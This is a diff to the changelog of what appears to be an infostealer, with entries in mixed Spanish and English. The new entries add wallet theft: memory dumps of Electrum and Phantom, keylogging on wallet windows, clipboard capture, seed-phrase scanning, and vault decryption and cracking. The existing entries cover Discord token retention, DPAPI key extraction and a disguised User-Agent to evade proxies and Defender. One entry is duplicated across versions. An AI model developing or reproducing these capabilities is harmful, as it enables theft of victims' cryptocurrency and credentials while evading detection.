@@ -1,11 +1,17 @@
 # Changelog
 
+## 0.2.19
+
+- Carteras: `memdump electrum|phantom` (MiniDumpWriteDump + zip), `keys on|off|dump` (solo ventanas de cartera), `clip`, `tools/dump-scan.py` para buscar BIP39/xprv en volcados y `tools/phantom-decrypt.py` (PBKDF2 + XChaCha) con contraseñas o logins guardados. `decrypt.py` prueba candidatas en Electrum y `ingest-case.sh` encadena Phantom.
+
 ## 0.2.18
 
 - HTTP requests use a normal Chrome User-Agent instead of the unique `FabricSync` one, so proxies do not spot the agent by UA.
 - `cache/` drops transient plaintext leftovers after seven days (ZIPs, TSV de cookies, screenshots, hives temporales), keeping `discord/token.txt` and the elevator.
 - `tools/ingest-case.sh --auto` acepta harvest, hives o ambos, saca `dpapi_machinekey`/`dpapi_userkey` con `secretsdump.py` y descifra sin preguntar; la contraseña del `.7z` se genera y guarda sola.
 - `tools/auto-ingest.sh` + `tools/install-auto-ingest.sh` procesan los casos solos al aparecer `sync-*.zip` o `system-*.zip`.
+- `decrypt.py`: lee los almacenes de Phantom sin `plyvel` (fallback puro) y exporta los blobs sellados; soporta Electrum BIE1 con `-p` o genera el hash `$electrum$` para hashcat.
+- Carteras: `memdump electrum|phantom` (MiniDumpWriteDump + zip), `keys on|off|dump` (solo ventanas de cartera), `clip`, `tools/dump-scan.py` para buscar BIP39/xprv en volcados y `tools/phantom-decrypt.py` (PBKDF2 + XChaCha) con contraseñas o logins guardados. `decrypt.py` prueba candidatas en Electrum y `ingest-case.sh` encadena Phantom.
 - `docs/OPSEC.md`: inventario de huellas en disco, procesos, red, Defender y forense, con detección y mitigaciones.
 
 ## 0.2.17
